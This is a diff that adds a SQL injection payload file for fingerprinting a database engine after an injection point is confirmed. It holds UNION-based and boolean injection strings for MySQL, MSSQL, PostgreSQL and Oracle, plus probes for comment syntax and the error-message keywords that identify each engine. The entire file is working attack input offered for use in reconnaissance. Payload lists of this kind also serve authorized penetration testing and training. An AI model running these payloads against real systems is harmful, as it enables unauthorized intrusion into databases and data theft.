@@ -1,0 +1,47 @@
+# ─────────────────────────────────────────────
+# DB FINGERPRINT PAYLOADS
+# Run these after confirming SQLi exists
+# Observe error messages or response differences
+# ─────────────────────────────────────────────
+
+# --- Version string queries ---
+# MySQL / MSSQL
+' AND @@version--
+' UNION SELECT @@version--
+' AND 1=CONVERT(int,@@version)--
+
+# PostgreSQL
+' AND version()--
+' UNION SELECT version()--
+
+# Oracle
+' UNION SELECT banner FROM v$version--
+' UNION SELECT banner,NULL FROM v$version--
+
+# --- DB-specific syntax probes ---
+# MySQL: string concatenation with CONCAT
+' AND 'a'='a' AND CONCAT('a','b')='ab'--
+
+# MSSQL: string concatenation with +
+' AND 'a'='a' AND 'a'+'b'='ab'--
+
+# PostgreSQL: string concatenation with ||
+' AND 'a'='a' AND 'a'||'b'='ab'--
+
+# Oracle: FROM DUAL required
+' AND 1=1 FROM DUAL--
+' UNION SELECT NULL FROM DUAL--
+
+# --- Comment style probes ---
+# MySQL supports #
+1'#
+# MSSQL/PG support --
+1'--
+# MySQL/MSSQL support /* */
+1'/*comment*/--
+
+# --- Identify by error message keywords ---
+# MySQL:    "You have an error in your SQL syntax"
+# MSSQL:    "Unclosed quotation mark" / "Incorrect syntax"
+# PG:       "unterminated quoted string" / "syntax error at"
+# Oracle:   "ORA-" prefix errors
